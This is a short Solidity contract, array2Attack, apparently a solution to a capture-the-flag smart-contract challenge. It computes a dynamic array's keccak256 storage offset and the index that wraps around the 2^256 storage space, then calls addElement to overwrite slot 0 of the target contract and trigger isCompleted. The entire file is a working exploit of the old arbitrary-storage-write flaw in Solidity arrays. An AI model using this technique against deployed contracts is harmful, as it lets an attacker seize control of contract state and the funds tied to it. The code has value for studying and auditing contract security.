pragma solidity ^0.4.24;
import "./array2.sol";
contract array2Attack{
    check che;
    constructor(address _che){
        che = check(_che);
    }
    //fig计算数组的起始位置
    function fig(uint256 slot)public pure returns(bytes32){
        return keccak256(bytes32(slot));
    }
    //fig1计算让数组长度溢出需要的长度
    function fig1(uint256 slot)public pure returns(uint256){
        return 2**256-1-slot+1;
    }

    function complete()public{
        che.arr().addElement(fig1(uint256(fig(1))),1);
        che.isCompleted();
    }

}